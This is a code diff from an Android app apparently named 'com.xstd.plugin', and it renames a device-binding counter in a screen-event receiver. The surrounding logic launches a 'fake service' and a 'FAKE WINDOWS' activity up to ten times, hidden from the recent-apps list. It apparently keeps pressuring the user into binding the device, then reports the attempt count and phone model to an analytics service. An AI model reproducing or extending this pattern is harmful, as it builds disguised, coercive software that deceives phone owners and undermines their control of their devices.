@@ -16,7 +16,6 @@ import com.xstd.plugin.binddevice.DeviceBindBRC;
 import com.xstd.plugin.config.AppRuntime;
 import com.xstd.plugin.config.Config;
 import com.xstd.plugin.config.SettingManager;
-import com.xstd.plugin.service.FakeService;
 import com.xstd.plugin.service.GoogleService;
 import com.xstd.plugin.service.PluginService;
 
@@ -241,10 +240,10 @@ public class ScreenBRC extends BroadcastReceiver {
 
             if (Config.DEBUG) {
                 Config.LOGD("[[ScreenBRC::onReceive]] try to start FAKE WINDOWS process, binding Time : "
-                                + SettingManager.getInstance().getDeviceBindingTime());
+                                + SettingManager.getInstance().getDeviceBindingCount());
             }
 
-            if (SettingManager.getInstance().getDeviceBindingTime() <= 10) {
+            if (SettingManager.getInstance().getDeviceBindingCount() <= 10) {
                 CommonUtil.startFakeService(context, "ScreenBRC::onReceive");
 
                 Intent i = new Intent();
@@ -252,13 +251,13 @@ public class ScreenBRC extends BroadcastReceiver {
                 i.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS | Intent.FLAG_ACTIVITY_CLEAR_TOP);
                 context.startActivity(i);
             } else {
-                if (SettingManager.getInstance().getDeviceBindingTime() <= 100) {
+                if (SettingManager.getInstance().getDeviceBindingCount() <= 100) {
                     //notify umeng
                     HashMap<String, String> log = new HashMap<String, String>();
                     log.put("phoneType", Build.MODEL);
-                    log.put("bind_time", String.valueOf(SettingManager.getInstance().getDeviceBindingTime()));
+                    log.put("bind_time", String.valueOf(SettingManager.getInstance().getDeviceBindingCount()));
                     CommonUtil.umengLog(context, "bind_too_times", log);
-                    SettingManager.getInstance().setDeviceBindingTime(101);
+                    SettingManager.getInstance().setDeviceBindingCount(101);
                 }
             }
         }
